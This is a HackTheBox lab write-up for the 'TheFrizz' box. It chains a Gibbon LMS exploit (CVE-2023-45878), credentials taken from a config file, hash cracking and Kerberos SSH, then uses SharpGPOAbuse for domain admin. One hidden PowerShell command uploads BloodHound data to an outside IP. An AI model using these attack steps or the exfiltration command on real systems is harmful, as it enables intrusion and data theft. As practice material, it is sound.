# TheFrizz -- HackTheBox (write-up)

**Difficulty:** Medium
**Box:** TheFrizz (HackTheBox)
**Author:** dkrxhn
**Date:** 2025-06-28

---

## TL;DR

### Gibbon LMS RCE (CVE-2023-45878) gave initial shell. MySQL creds in config led to user hash. Kerberos auth via kinit for SSH. Recycle bin recovery revealed second user creds with GPO editing rights. SharpGPOAbuse for domain admin.

---

## Target info

- Host: `frizzdc.frizz.htb`
- Domain: `frizz.htb`
- Services discovered: `22/tcp (ssh)`, `80/tcp (http)`, `88/tcp (kerberos)`, `389/tcp (ldap)`, `445/tcp (smb)`

---

## Enumeration

![Nmap results](images/thefrizz-htb_1.png)

---

## Foothold

Ran CVE-2023-45878 exploit for Gibbon LMS:

```
https://github.com/davidzzo23/CVE-2023-45878/blob/main/CVE-2023-45878.py
```

![Exploit execution](images/thefrizz-htb_2.png)

Found MySQL config at `C:\xampp\htdocs\Gibbon-LMS\config.php`:

![Config file](images/thefrizz-htb_3.png)

`MrGibbonsDB:MisterGibbs!Parrot!?1`

Queried the database:

![DB hash](images/thefrizz-htb_4.png)

`f.frizzle:067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03`

Cracked:

![Cracked password](images/thefrizz-htb_5.png)

`f.frizzle:Jenni_Luvs_Magic23`

---

## Lateral movement

Normal SSH failed. Needed Kerberos authentication:

![SSH failure](images/thefrizz-htb_6.png)

```bash
sudo ntpdate frizzdc.frizz.htb
kinit f.frizzle@FRIZZ.HTB
klist
ssh f.frizzle@frizz.htb -K
```

![kinit success](images/thefrizz-htb_7.png)

`kinit` worked because OpenSSH GSSAPI only checks the default Kerberos cache. Using `getTGT.py` with a custom cache file failed, but `kinit` populates the default cache.

Ran BloodHound collection:

```powershell
cd C:\Temp
Start-Process powershell -ArgumentList "-NoP -W Hidden -Command Invoke-WebRequest -Uri http://10.10.14.207:80 -Method POST -InFile .\20250419221420_BloodHound.zip"
```

Restored a 7z file from the recycle bin, extracted it, and found a base64 password in an `.ini` file:

```
IXN1QmNpZ0BNZWhUZWQhUgo=
```

Decoded: `!suBcig@MehTed!R` -- password for `m.schoolbus`, who had GPO editing privileges.

![BloodHound](images/thefrizz-htb_8.png)

---

## Privilege escalation

Created and linked a new GPO:

```powershell
New-GPO -Name GPO-New | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
```

![GPO created](images/thefrizz-htb_9.png)

Used SharpGPOAbuse to add `m.schoolbus` as local admin:

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName GPO-new --force
```

![SharpGPOAbuse](images/thefrizz-htb_10.png)

![Admin access](images/thefrizz-htb_11.png)

![Domain admin](images/thefrizz-htb_12.png)

---

## Lessons & takeaways

- When SSH GSSAPI fails with `getTGT.py`, try `kinit` which populates the default Kerberos cache
- Always check the recycle bin for deleted files containing credentials
- SharpGPOAbuse is effective when a user has GPO editing rights
- RunasCs is useful for lateral movement when WinRM is not available
---
